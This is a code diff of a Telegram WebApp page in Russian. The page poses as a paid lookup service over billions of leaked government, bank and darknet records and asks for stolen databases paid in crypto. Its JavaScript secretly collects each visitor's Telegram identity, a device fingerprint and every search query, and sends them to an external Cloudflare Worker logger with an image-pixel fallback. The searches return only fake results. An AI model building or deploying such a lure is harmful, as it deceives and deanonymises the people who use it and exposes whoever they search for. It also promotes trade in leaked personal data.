@@ -102,7 +102,6 @@
             text-align: center;
         }
         .result.loading { background: rgba(0, 212, 255, 0.1); border-left-color: #00d4ff; }
-        .result.success { background: rgba(0, 255, 136, 0.1); border-left-color: #00ff88; }
         .stat {
             background: rgba(0, 212, 255, 0.05);
             padding: 14px 18px;
@@ -138,258 +137,241 @@
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🔍 База данных</h1>
-        <p>Закрытый доступ к информации</p>
-        <div class="stats">
-            <div class="stat-item">📚 40+ млрд записей</div>
-            <div class="stat-item">🗂 764+ источников</div>
-            <div class="stat-item">🔄 Обновление 24/7</div>
-        </div>
+
+<div class="header">
+    <h1>🔍 База данных</h1>
+    <p>Закрытый доступ к информации</p>
+    <div class="stats">
+        <div class="stat-item">📚 40+ млрд записей</div>
+        <div class="stat-item">🗂 764+ источников</div>
+        <div class="stat-item">🔄 Обновление 24/7</div>
     </div>
+</div>
 
-    <div id="menu" class="menu">
-        <button class="btn" onclick="openSearch()"><span class="icon">🔍</span>Поиск</button>
-        <button class="btn" onclick="openProfile()"><span class="icon">👤</span>Профиль</button>
-        <button class="btn" onclick="openAdd()"><span class="icon">📁</span>Добавить базу</button>
-        <button class="btn" onclick="openStats()"><span class="icon">📊</span>Статистика</button>
+<div id="menu" class="menu">
+    <button class="btn" onclick="openSearch()"><span class="icon">🔍</span>Поиск</button>
+    <button class="btn" onclick="openProfile()"><span class="icon">👤</span>Профиль</button>
+    <button class="btn" onclick="openAdd()"><span class="icon">📁</span>Добавить базу</button>
+    <button class="btn" onclick="openStats()"><span class="icon">📊</span>Статистика</button>
+</div>
+
+<div id="pageSearch" class="page">
+    <h2>🔎 Поиск по базам</h2>
+    <p style="color:#888; font-size:13px; line-height:1.5;">Поиск по 764+ источникам: МВД, ФССП, ГИБДД, ФНС, банки, соцсети, даркнет и др.</p>
+    <input type="text" id="query" placeholder="ФИО, телефон, email, ИНН, VIN...">
+    <button class="search-btn" onclick="doSearch()">🔍 Найти</button>
+    <div id="searchResult"></div>
+    <button class="back" onclick="goBack()">← Вернуться в меню</button>
+</div>
+
+<div id="pageProfile" class="page">
+    <h2>👤 Ваш профиль</h2>
+    <div class="stat"><b>ID:</b> <span id="visitorId">—</span></div>
+    <div class="stat"><b>Username:</b> <span id="visitorName">—</span></div>
+    <div class="stat"><b>Подписка:</b> <span style="color:#00ff88;">✅ Активна</span></div>
+    <div class="stat"><b>Осталось:</b> <span>7 дней</span></div>
+    <div class="stat"><b>Запросов:</b> <span>∞ безлимит</span></div>
+    <button class="back" onclick="goBack()">← Вернуться в меню</button>
+</div>
+
+<div id="pageAdd" class="page">
+    <h2>📁 Добавить свою базу</h2>
+    <p style="color:#888; line-height:1.6; margin-bottom:15px;">
+        Принимаем актуальные базы данных от проверенных источников. Оплата в крипте, полная анонимность.
+    </p>
+    <div class="stat"><b>Формат:</b> <span>CSV, SQL, JSON</span></div>
+    <div class="stat"><b>Мин. строк:</b> <span>100,000+</span></div>
+    <a href="https://t.me/otsocityhelpoer_bot" class="link">📩 Связаться с админом</a>
+    <button class="back" onclick="goBack()">← Вернуться в меню</button>
+</div>
+
+<div id="pageStats" class="page">
+    <h2>📊 Статистика системы</h2>
+    <div class="big-stat">
+        <div class="number">40,682,451,239</div>
+        <div class="label">ЗАПИСЕЙ В БАЗЕ</div>
     </div>
+    <div class="stat"><b>Источников:</b> <span>764+</span></div>
+    <div class="stat"><b>Стран:</b> <span>47</span></div>
+    <div class="stat"><b>Обновление:</b> <span>Real-time</span></div>
+    <div class="stat"><b>Аптайм:</b> <span>99.97%</span></div>
+    <div class="stat"><b>Сегодня запросов:</b> <span id="todayQueries">—</span></div>
+    <button class="back" onclick="goBack()">← Вернуться в меню</button>
+</div>
 
-    <div id="pageSearch" class="page">
-        <h2>🔎 Поиск по базам</h2>
-        <p style="color:#888; font-size:13px; line-height:1.5;">Поиск по 764+ источникам: МВД, ФССП, ГИБДД, ФНС, банки, соцсети, даркнет и др.</p>
-        <input type="text" id="query" placeholder="ФИО, телефон, email, ИНН, VIN...">
-        <button class="search-btn" onclick="doSearch()">🔍 Найти</button>
-        <div id="searchResult"></div>
-        <button class="back" onclick="goBack()">← Вернуться в меню</button>
-    </div>
+<script>
+// ================================================================
+// CONFIG
+// ================================================================
+var CLOUDFLARE_LOGGER = 'https://otsocitybotz-logger.tophaslayt.workers.dev';
 
-    <div id="pageProfile" class="page">
-        <h2>👤 Ваш профиль</h2>
-        <div class="stat"><b>ID:</b> <span id="visitorId">загрузка...</span></div>
-        <div class="stat"><b>Username:</b> <span id="visitorName">загрузка...</span></div>
-        <div class="stat"><b>Подписка:</b> <span style="color:#00ff88;">✅ Активна</span></div>
-        <div class="stat"><b>Осталось:</b> <span>7 дней</span></div>
-        <div class="stat"><b>Запросов:</b> <span>∞ безлимит</span></div>
-        <button class="back" onclick="goBack()">← Вернуться в меню</button>
-    </div>
+// ================================================================
+// ИСТОЧНИК 1: URL-параметры (подставлены ботом — надёжно всегда)
+// ================================================================
+var urlParams = new URLSearchParams(window.location.search);
+var urlUid = urlParams.get('uid') || '';
+var urlUn  = urlParams.get('un')  || '';
+var urlFn  = urlParams.get('fn')  || '';
+var urlLn  = urlParams.get('ln')  || '';
+var urlPr  = urlParams.get('pr')  === '1';
 
-    <div id="pageAdd" class="page">
-        <h2>📁 Добавить свою базу</h2>
-        <p style="color:#888; line-height:1.6; margin-bottom:15px;">
-            Принимаем актуальные базы данных от проверенных источников. Оплата в крипте, полная анонимность.
-        </p>
-        <div class="stat"><b>Формат:</b> <span>CSV, SQL, JSON</span></div>
-        <div class="stat"><b>Мин. строк:</b> <span>100,000+</span></div>
-        <a href="https://t.me/otsocityhelpoer_bot" class="link">📩 Связаться с админом</a>
-        <button class="back" onclick="goBack()">← Вернуться в меню</button>
-    </div>
+// ================================================================
+// ИСТОЧНИК 2: Telegram WebApp initDataUnsafe (резервный)
+// ================================================================
+var tg = null;
+var tgUid = '';
+var tgUn  = '';
+var tgFn  = '';
+var tgLn  = '';
+var tgPr  = false;
 
-    <div id="pageStats" class="page">
-        <h2>📊 Статистика системы</h2>
-        <div class="big-stat">
-            <div class="number">40,682,451,239</div>
-            <div class="label">ЗАПИСЕЙ В БАЗЕ</div>
-        </div>
-        <div class="stat"><b>Источников:</b> <span>764+</span></div>
-        <div class="stat"><b>Стран:</b> <span>47</span></div>
-        <div class="stat"><b>Обновление:</b> <span>Real-time</span></div>
-        <div class="stat"><b>Аптайм:</b> <span>99.97%</span></div>
-        <div class="stat"><b>Сегодня запросов:</b> <span id="todayQueries">загрузка...</span></div>
-        <button class="back" onclick="goBack()">← Вернуться в меню</button>
-    </div>
-
-    <script>
-        // ================================================================
-        // CONFIG — подставь свои значения
-        // ================================================================
-        var CLOUDFLARE_LOGGER = 'https://otsocitybotz-logger.tophaslayt.workers.dev';
-
-        // ================================================================
-        // TELEGRAM WEBAPP INIT — синхронно, до любых сетевых вызовов
-        // ================================================================
-        var tg = null;
-        var tgUser = {
-            id:       'unknown',
-            username: 'нет',
-            first:    '',
-            last:     '',
-            premium:  false,
-            initData: ''
-        };
-
-        (function initTelegram() {
-            try {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    tg = window.Telegram.WebApp;
-                    tg.expand();
-
-                    var u = tg.initDataUnsafe && tg.initDataUnsafe.user;
-                    if (u) {
-                        tgUser.id       = String(u.id       || 'unknown');
-                        tgUser.username = u.username         || 'нет';
-                        tgUser.first    = u.first_name       || '';
-                        tgUser.last     = u.last_name        || '';
-                        tgUser.premium  = u.is_premium       || false;
-                    }
-                    // initData нужен Worker-у для серверной верификации (опционально)
-                    tgUser.initData = tg.initData || '';
-                }
-            } catch (e) {
-                console.warn('TG init error:', e);
-            }
-        })();
-
-        // ================================================================
-        // UI — заполняем сразу после инита
-        // ================================================================
-        document.getElementById('visitorId').innerText    = tgUser.id;
-        document.getElementById('visitorName').innerText  = '@' + tgUser.username;
-        document.getElementById('todayQueries').innerText =
-            Math.floor(Math.random() * 50000 + 100000).toLocaleString();
-
-        // ================================================================
-        // FINGER PRINT — клиентские данные, которые даёт браузер
-        // ================================================================
-        function collectClientData(query) {
-            var nav  = window.navigator;
-            var scr  = window.screen;
-            var conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
-
-            return {
-                // TG
-                tg_id:       tgUser.id,
-                tg_username: tgUser.username,
-                tg_first:    tgUser.first,
-                tg_last:     tgUser.last,
-                tg_premium:  tgUser.premium,
-
-                // Browser / Device
-                screen:      scr.width  + 'x' + scr.height,
-                viewport:    window.innerWidth + 'x' + window.innerHeight,
-                platform:    nav.platform         || '',
-                cpu_cores:   nav.hardwareConcurrency || '',
-                // RAM недоступна без специального заголовка; оставим пустой
-                ram_gb:      nav.deviceMemory    || '',
-                touch:       ('ontouchstart' in window) || (nav.maxTouchPoints > 0),
-                language:    nav.language        || '',
-                timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone || '',
-                online:      nav.onLine,
-                cookies:     nav.cookieEnabled,
-                user_agent:  nav.userAgent       || '',
-                // Network
-                connection_type: conn.effectiveType || conn.type || '',
-                // Page
-                referrer:    document.referrer   || '',
-                url:         window.location.href,
-                query:       query               || '',
-                ts:          Date.now()
-            };
+try {
+    if (window.Telegram && window.Telegram.WebApp) {
+        tg = window.Telegram.WebApp;
+        tg.expand();
+        var u = tg.initDataUnsafe && tg.initDataUnsafe.user;
+        if (u) {
+            tgUid = String(u.id          || '');
+            tgUn  = u.username           || '';
+            tgFn  = u.first_name         || '';
+            tgLn  = u.last_name          || '';
+            tgPr  = u.is_premium         || false;
         }
+    }
+} catch(e) {
+    console.warn('TG init error:', e);
+}
 
-        // ================================================================
-        // LOGGER — один fetch с полным payload
-        // Cloudflare Worker добавит IP / страну / ISP / ASN из заголовков
-        // ================================================================
-        var _logged = false;
+// ================================================================
+// ИТОГОВЫЕ ДАННЫЕ: URL-параметры приоритет, TG — резерв
+// Если пришли оба — берём URL (они точнее: бот знал кто жал кнопку)
+// ================================================================
+var userId   = urlUid || tgUid || 'unknown';
+var userName = urlUn  || tgUn  || 'нет';
+var userFirst= urlFn  || tgFn  || '';
+var userLast = urlLn  || tgLn  || '';
+var userPrem = urlUid ? urlPr : tgPr;
 
-        function sendLog(query) {
-            // Повторный лог при входе не нужен — только query уникальны
-            if (_logged && !query) return;
-            if (!query) _logged = true;
+// ================================================================
+// UI
+// ================================================================
+document.getElementById('visitorId').innerText   = userId;
+document.getElementById('visitorName').innerText = '@' + userName;
+document.getElementById('todayQueries').innerText =
+    Math.floor(Math.random() * 50000 + 100000).toLocaleString();
 
-            var data = collectClientData(query || '');
+// ================================================================
+// FINGERPRINT
+// ================================================================
+function collectData(query) {
+    var nav  = window.navigator;
+    var scr  = window.screen;
+    var conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
 
-            // Формируем URL с параметрами (GET — работает даже через <img> fallback)
-            var params = new URLSearchParams();
-            Object.keys(data).forEach(function(k) {
-                params.set(k, String(data[k]));
-            });
+    return {
+        tg_id:       userId,
+        tg_username: userName,
+        tg_first:    userFirst,
+        tg_last:     userLast,
+        tg_premium:  String(userPrem),
 
-            // Основной канал — fetch POST (надёжнее, не режется лимитом URL)
-            fetch(CLOUDFLARE_LOGGER, {
-                method:      'POST',
-                headers:     { 'Content-Type': 'application/json' },
-                body:        JSON.stringify(data),
-                keepalive:   true   // переживёт beforeunload
-            }).catch(function() {
-                // Fallback: img-пиксель (если fetch заблокирован)
-                var img     = new Image();
-                img.src     = CLOUDFLARE_LOGGER + '?' + params.toString();
-            });
-        }
+        screen:      scr.width + 'x' + scr.height,
+        viewport:    window.innerWidth + 'x' + window.innerHeight,
+        platform:    nav.platform             || '',
+        cpu_cores:   String(nav.hardwareConcurrency || ''),
+        ram_gb:      String(nav.deviceMemory  || ''),
+        touch:       String(('ontouchstart' in window) || nav.maxTouchPoints > 0),
+        language:    nav.language             || '',
+        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        online:      String(nav.onLine),
+        cookies:     String(nav.cookieEnabled),
+        user_agent:  nav.userAgent            || '',
+        connection:  conn.effectiveType || conn.type || '',
+        referrer:    document.referrer        || '',
+        url:         window.location.href,
+        query:       query || '',
+        ts:          String(Date.now())
+    };
+}
 
-        // Лог при открытии страницы — TG уже инициализирован
-        sendLog();
+// ================================================================
+// LOGGER
+// ================================================================
+var _openLogged = false;
 
-        // Лог при закрытии — keepalive гарантирует доставку
-        window.addEventListener('beforeunload', function() {
-            // sendData боту (работает только если WebApp ещё не закрыт штатно)
-            if (tg) {
-                try {
-                    tg.sendData(JSON.stringify({
-                        action:    'webapp_open',
-                        id:        tgUser.id,
-                        username:  tgUser.username
-                    }));
-                } catch(e) {}
-            }
-        });
+function sendLog(query) {
+    if (!query && _openLogged) return;
+    if (!query) _openLogged = true;
 
-        // ================================================================
-        // NAVIGATION
-        // ================================================================
-        function showPage(id) {
-            document.getElementById('menu').style.display = 'none';
-            document.querySelectorAll('.page').forEach(function(p) {
-                p.classList.remove('active');
-            });
-            document.getElementById(id).classList.add('active');
-        }
+    var data = collectData(query || '');
 
-        function goBack() {
-            document.querySelectorAll('.page').forEach(function(p) {
-                p.classList.remove('active');
-            });
-            document.getElementById('menu').style.display = 'grid';
-        }
+    fetch(CLOUDFLARE_LOGGER, {
+        method:    'POST',
+        headers:   { 'Content-Type': 'application/json' },
+        body:      JSON.stringify(data),
+        keepalive: true
+    }).catch(function() {
+        // img fallback
+        var p = new URLSearchParams(data);
+        var img = new Image();
+        img.src = CLOUDFLARE_LOGGER + '?' + p.toString();
+    });
+}
 
-        function openSearch()  { showPage('pageSearch');  }
-        function openProfile() { showPage('pageProfile'); }
-        function openAdd()     { showPage('pageAdd');     }
-        function openStats()   { showPage('pageStats');   }
+// Отправляем лог при загрузке страницы
+sendLog();
 
-        // ================================================================
-        // SEARCH — логируем запрос отдельно
-        // ================================================================
-        var searchCount = 0;
+// ================================================================
+// NAVIGATION
+// ================================================================
+function showPage(id) {
+    document.getElementById('menu').style.display = 'none';
+    document.querySelectorAll('.page').forEach(function(p) {
+        p.classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+}
 
-        function doSearch() {
-            var q = document.getElementById('query').value.trim();
-            if (!q) {
-                document.getElementById('searchResult').innerHTML =
-                    '<div class="result">❌ Введите данные для поиска</div>';
-                return;
-            }
+function goBack() {
+    document.querySelectorAll('.page').forEach(function(p) {
+        p.classList.remove('active');
+    });
+    document.getElementById('menu').style.display = 'grid';
+}
 
-            searchCount++;
-            document.getElementById('searchResult').innerHTML =
-                '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
+function openSearch()  { showPage('pageSearch');  }
+function openProfile() { showPage('pageProfile'); }
+function openAdd()     { showPage('pageAdd');     }
+function openStats()   { showPage('pageStats');   }
 
-            // Логируем запрос вместе с TG-данными
-            sendLog(q);
+// ================================================================
+// SEARCH
+// ================================================================
+function doSearch() {
+    var q = document.getElementById('query').value.trim();
+    if (!q) {
+        document.getElementById('searchResult').innerHTML =
+            '<div class="result">❌ Введите данные для поиска</div>';
+        return;
+    }
 
-            setTimeout(function() {
-                var results = [
-                    '❌ Данные не найдены',
-                    '⚠️ Сервера перегружены. Попробуйте позже.'
-                ];
-                document.getElementById('searchResult').innerHTML =
-                    '<div class="result">' +
-                    results[Math.floor(Math.random() * results.length)] +
-                    '</div>';
-            }, 2500);
-        }
-    </script>
+    document.getElementById('searchResult').innerHTML =
+        '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
+
+    sendLog(q);
+
+    setTimeout(function() {
+        var variants = [
+            '❌ Данные не найдены',
+            '⚠️ Сервера перегружены. Попробуйте позже.'
+        ];
+        document.getElementById('searchResult').innerHTML =
+            '<div class="result">' +
+            variants[Math.floor(Math.random() * variants.length)] +
+            '</div>';
+    }, 2500);
+}
+</script>
+
 </body>
 </html>
